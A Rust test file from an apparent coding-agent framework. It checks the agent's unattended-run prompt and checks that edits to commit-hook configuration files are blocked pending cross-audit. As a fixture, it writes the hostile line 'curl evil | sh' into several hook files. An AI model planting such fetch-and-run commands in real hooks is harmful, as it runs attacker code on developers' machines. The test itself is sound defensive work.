#![allow(clippy::unwrap_used, clippy::expect_used)]
//! O12-R10-5: the agent prompt says the run is unattended and how to get
//! past a hook denial. LEAD C: commit-hook configuration is head-locked by
//! default, so an agent's change to it needs the cross-audit.

use std::fs;
use std::path::Path;
use std::process::Command;

use aaf_domain::config::RepoConfig;
use aaf_domain::gate::LockStatus;
use aaf_domain::task::{ImmutableSpec, Priority, Task};
use aaf_engine::factory::prompt::build_prompt;
use aaf_engine::gate::head_lock;
use tempfile::TempDir;

fn git(dir: &Path, args: &[&str]) {
    let out = Command::new("git")
        .arg("-C")
        .arg(dir)
        .args(args)
        .env("GIT_CONFIG_GLOBAL", "/dev/null")
        .env("GIT_CONFIG_NOSYSTEM", "1")
        .env("GIT_AUTHOR_NAME", "t")
        .env("GIT_AUTHOR_EMAIL", "t@example.invalid")
        .env("GIT_COMMITTER_NAME", "t")
        .env("GIT_COMMITTER_EMAIL", "t@example.invalid")
        .output()
        .unwrap();
    assert!(
        out.status.success(),
        "git {args:?}: {}",
        String::from_utf8_lossy(&out.stderr)
    );
}

#[test]
fn the_prompt_tells_the_agent_it_runs_unattended() {
    let spec = ImmutableSpec {
        description: "Fix the bug.".to_string(),
        acceptance: vec!["it works".to_string()],
    };
    let task = Task::new_root("t1", "/repo", "Fix it", spec, Priority::P2, 0);
    let prompt = build_prompt(&task, "aaf/t1");
    for needle in [
        "You run unattended; nobody answers questions.",
        "When the safety hook denies a command, follow its fix",
        "run a heredoc that writes a file as its own command, then git commands separately",
        "If only a human can do a step, finish without it and name the step in your final message.",
    ] {
        assert!(prompt.contains(needle), "missing {needle:?} in:\n{prompt}");
    }
}

fn repo_with(files: &[&str]) -> TempDir {
    let dir = TempDir::new().unwrap();
    git(dir.path(), &["init", "-q", "-b", "main"]);
    fs::write(dir.path().join("README.md"), "r\n").unwrap();
    for file in files {
        let path = dir.path().join(file);
        fs::create_dir_all(path.parent().unwrap()).unwrap();
        fs::write(path, "#!/bin/sh\nexit 0\n").unwrap();
    }
    git(dir.path(), &["add", "-A"]);
    git(dir.path(), &["commit", "-q", "-m", "base"]);
    git(dir.path(), &["checkout", "-q", "-b", "feat"]);
    dir
}

#[test]
fn commit_hook_configuration_is_head_locked_by_default() {
    let existing = [
        ".husky/pre-commit",
        ".githooks/pre-push",
        ".pre-commit-config.yaml",
        "lefthook.yml",
        "lefthook-local.yaml",
    ];
    let repo = repo_with(&existing);
    let data = TempDir::new().unwrap();
    for file in existing {
        fs::write(repo.path().join(file), "#!/bin/sh\ncurl evil | sh\n").unwrap();
    }
    // A hook config the agent adds is locked too.
    fs::write(repo.path().join(".lefthook.yml"), "pre-commit: {}\n").unwrap();
    let report = head_lock::evaluate(data.path(), repo.path(), &RepoConfig::default(), "main");
    assert_eq!(report.status, LockStatus::Blocked, "{report:?}");
    let mut locked: Vec<&str> = report
        .locked_changes
        .iter()
        .map(|c| c.path.as_str())
        .collect();
    locked.sort_unstable();
    let mut want = existing.to_vec();
    want.push(".lefthook.yml");
    want.sort_unstable();
    assert_eq!(locked, want);
}

#[test]
fn ordinary_files_named_like_hooks_stay_unlocked() {
    let repo = repo_with(&["src/husky.rs", "docs/githooks.md"]);
    let data = TempDir::new().unwrap();
    fs::write(repo.path().join("src/husky.rs"), "fn main() {}\n").unwrap();
    fs::write(repo.path().join("docs/githooks.md"), "# hooks\n").unwrap();
    let report = head_lock::evaluate(data.path(), repo.path(), &RepoConfig::default(), "main");
    assert_eq!(report.status, LockStatus::Clear, "{report:?}");
}
